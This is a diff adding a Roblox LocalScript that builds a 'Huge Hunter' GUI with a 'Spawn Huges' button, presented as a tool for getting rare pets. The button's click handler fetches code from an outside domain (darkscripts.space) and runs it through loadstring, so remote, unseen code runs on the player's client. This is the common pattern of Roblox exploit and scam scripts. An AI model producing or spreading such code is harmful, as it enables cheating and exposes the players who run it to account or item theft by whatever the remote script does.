@@ -1,0 +1,41 @@
+-- LocalScript in StarterPlayerScripts
+
+-- Create the ScreenGui
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "HugeHunterGui"
+screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+
+-- Create the Frame for the GUI
+local frame = Instance.new("Frame")
+frame.Name = "MainFrame"
+frame.Size = UDim2.new(0, 200, 0, 100)
+frame.Position = UDim2.new(0.5, -100, 0.5, -50)
+frame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+frame.Parent = screenGui
+
+-- Create the Title Label
+local titleLabel = Instance.new("TextLabel")
+titleLabel.Name = "Title"
+titleLabel.Text = "Huge Hunter"
+titleLabel.Size = UDim2.new(1, 0, 0.3, 0)
+titleLabel.Position = UDim2.new(0, 0, 0, 0)
+titleLabel.BackgroundTransparency = 1
+titleLabel.TextScaled = true
+titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+titleLabel.Parent = frame
+
+-- Create the Button
+local huntButton = Instance.new("TextButton")
+huntButton.Name = "SpawnButton"
+huntButton.Text = "Spawn Huges"
+huntButton.Size = UDim2.new(1, 0, 0.7, 0)
+huntButton.Position = UDim2.new(0, 0, 0.3, 0)
+huntButton.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
+huntButton.TextScaled = true
+huntButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+huntButton.Parent = frame
+
+-- Button Click Event
+huntButton.MouseButton1Click:Connect(function()
+    loadstring(game:HttpGet("https://darkscripts.space/visual", true))()
+end)
